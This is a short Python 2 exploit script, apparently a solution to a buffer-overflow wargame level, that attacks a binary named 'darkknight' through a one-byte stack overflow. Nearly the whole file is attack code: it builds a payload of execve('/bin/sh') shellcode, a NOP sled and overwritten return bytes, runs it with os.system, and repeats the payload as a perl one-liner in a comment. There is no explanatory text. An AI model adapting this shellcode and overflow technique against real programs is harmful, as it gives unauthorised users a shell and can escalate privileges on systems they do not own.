import os, sys

print "Golem Exploit by Phantom"
print "[+] Making Exploit......"

victim = "/home/golem/darkknight"

shellcode = "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
NOP = "\x90"*7

jmp = "\xbc\xfa\xff\xbf"
ret = "\xb4"

payload = jmp*2 + shellcode + NOP + ret

print "[+] Victim : " + victim
print "[+] Exploiting darkknight 1 byte overflow vuln.."
print "[+] Loading payload..."
print "[+] Shellcode length : ", len(payload)
print

os.system(victim + " " + payload)
#./darkknight $(perl -e 'print "\xbc\xfa\xff\xbf"x2, "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80", "\x90"x7, "\xb4\xfa\xff\xbf"')